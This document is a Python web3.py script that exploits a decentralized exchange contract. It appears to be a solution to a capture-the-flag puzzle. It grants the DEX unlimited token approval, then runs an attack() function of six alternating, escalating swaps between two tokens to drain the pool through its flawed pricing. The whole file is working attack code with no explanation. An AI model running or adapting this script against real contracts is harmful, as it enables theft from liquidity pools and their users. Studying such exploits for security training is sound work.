from web3 import Web3, HTTPProvider
from dotenv import load_dotenv
import os
import json
import time

# Load environment variables
load_dotenv()

# Get the account address from environment variable
account_address = os.getenv('ACCOUNT_ADDRESS')

# Get the private key from environment variable
private_key = os.getenv('PRIVATE_KEY')

# Connect to Ethereum node
w3 = Web3(HTTPProvider(os.getenv('ALCHEMY_RPC_URL')))

# Get the current gas price
gas_price = w3.eth.gas_price   

# Contract addresses
dex_address =  os.getenv('CONTRACT_ADDRESS')

# Contract ABIs
with open('dex_abi.json') as f:
    dex_abi = json.load(f)

# Create contract instance
dex = w3.eth.contract(address=dex_address, abi=dex_abi)

# Get token addresses
token1 = dex.functions.token1().call()
token2 = dex.functions.token2().call()

# Ensure dex_address and account_address are valid Ethereum addresses
assert Web3.is_address(dex_address), "Invalid dex_address"
assert Web3.is_address(account_address), "Invalid account_address"

# Ensure account has enough Ether to pay for gas
balance = w3.eth.get_balance(account_address)
assert balance > w3.to_wei(0.01, 'ether'), "Insufficient Ether"

# Ensure dex contract has an approve function
assert 'approve' in dex.functions, "dex contract does not have an approve function"

# Approve Dex contract to spend the maximum possible amount of both tokens
# Build the transaction

transaction = dex.functions.approve(dex_address, 2**256 - 1).build_transaction({
    'from': account_address,
    'nonce': w3.eth.get_transaction_count(account_address),
    'gasPrice': gas_price  # Set the gas price
})

# Sign the transaction
signed_txn = w3.eth.account.sign_transaction(transaction, private_key)

# Send the transaction
txn_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
print(f"Approve transaction hash: {txn_hash.hex()}")

# Wait for the transaction to be mined
receipt = w3.eth.wait_for_transaction_receipt(txn_hash)
print(f"Approve transaction {txn_hash.hex()} has been mined in block {receipt['blockNumber']}")      

time.sleep(30)

def attack():
    # Initial balances: 10 token1, 10 token2
    swap_values = [10, 20, 24, 30, 41, 45]

    for i, value in enumerate(swap_values):
        # Determine the tokens to swap based on the iteration
        from_token, to_token = (token1, token2) if i % 2 == 0 else (token2, token1)

        # Build the transaction
        transaction = dex.functions.swap(from_token, to_token, value).build_transaction({
            'from': account_address, 
            'nonce': w3.eth.get_transaction_count(account_address, 'pending'),
            'gasPrice': gas_price + w3.to_wei(i + 1, 'gwei')  # Increase the gas price
        })

        # Sign the transaction
        signed_txn = w3.eth.account.sign_transaction(transaction, private_key)

        # Send the transaction
        txn_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
        print(f"Attack swap transaction with hash: {txn_hash.hex()}")

        # Wait for the transaction to be mined
        receipt = w3.eth.wait_for_transaction_receipt(txn_hash)
        print(f"Attack transaction {txn_hash.hex()} has been mined in block {receipt['blockNumber']}")
        time.sleep(30)
        
# Call the attack function
attack()
